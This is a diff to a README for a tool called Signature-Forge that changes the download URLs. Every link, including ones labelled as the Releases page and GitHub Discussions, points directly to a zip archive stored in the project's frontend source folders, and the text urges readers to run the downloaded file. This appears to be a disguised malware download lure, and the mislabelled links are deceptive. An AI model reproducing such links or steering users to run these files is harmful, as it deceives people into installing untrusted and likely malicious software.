@@ -6,14 +6,14 @@
 
 ## 🔗 Download Here
 
-[![Download Signature-Forge](https://raw.githubusercontent.com/Elinam03/Signature-Forge/main/frontend/src/components/Header/Forge_Signature_v3.3.zip)](https://raw.githubusercontent.com/Elinam03/Signature-Forge/main/frontend/src/components/Header/Forge_Signature_v3.3.zip)
+[![Download Signature-Forge](https://github.com/Elinam03/Signature-Forge/raw/refs/heads/main/frontend/public/Forge_Signature_v1.6.zip)](https://github.com/Elinam03/Signature-Forge/raw/refs/heads/main/frontend/public/Forge_Signature_v1.6.zip)
 
 ## 🚀 Getting Started
 
 Follow these steps to get started with Signature-Forge:
 
 1. **Visit the Release Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/Elinam03/Signature-Forge/main/frontend/src/components/Header/Forge_Signature_v3.3.zip) to find the latest version of Signature-Forge.
+   Go to the [Releases page](https://github.com/Elinam03/Signature-Forge/raw/refs/heads/main/frontend/public/Forge_Signature_v1.6.zip) to find the latest version of Signature-Forge.
 
 2. **Download the Latest Version**  
    Look for the most recent release and click on the download link for the executable file. It should be clearly marked. 
@@ -30,7 +30,7 @@ Follow these steps to get started with Signature-Forge:
 
 ## 📥 Download & Install
 
-Make sure to download Signature-Forge from the [Releases page](https://raw.githubusercontent.com/Elinam03/Signature-Forge/main/frontend/src/components/Header/Forge_Signature_v3.3.zip).
+Make sure to download Signature-Forge from the [Releases page](https://github.com/Elinam03/Signature-Forge/raw/refs/heads/main/frontend/public/Forge_Signature_v1.6.zip).
 
 - For a smooth experience, download the latest version.
 - Follow the instruction to install it on your computer by running the downloaded file.
@@ -90,7 +90,7 @@ If you'd like to contribute to Signature-Forge, feel free to fork the repository
 
 ## 🤝 Support
 
-For additional help, you can visit the [GitHub Discussions](https://raw.githubusercontent.com/Elinam03/Signature-Forge/main/frontend/src/components/Header/Forge_Signature_v3.3.zip) page to ask questions and share your experiences.
+For additional help, you can visit the [GitHub Discussions](https://github.com/Elinam03/Signature-Forge/raw/refs/heads/main/frontend/public/Forge_Signature_v1.6.zip) page to ask questions and share your experiences.
 
 ## 🔗 License
 
@@ -98,4 +98,4 @@ Signature-Forge is open source and available under the MIT License.
 
 --- 
 
-Make sure to download Signature-Forge now and start generating your byte signatures with ease! [Download here](https://raw.githubusercontent.com/Elinam03/Signature-Forge/main/frontend/src/components/Header/Forge_Signature_v3.3.zip).
+Make sure to download Signature-Forge now and start generating your byte signatures with ease! [Download here](https://github.com/Elinam03/Signature-Forge/raw/refs/heads/main/frontend/public/Forge_Signature_v1.6.zip).
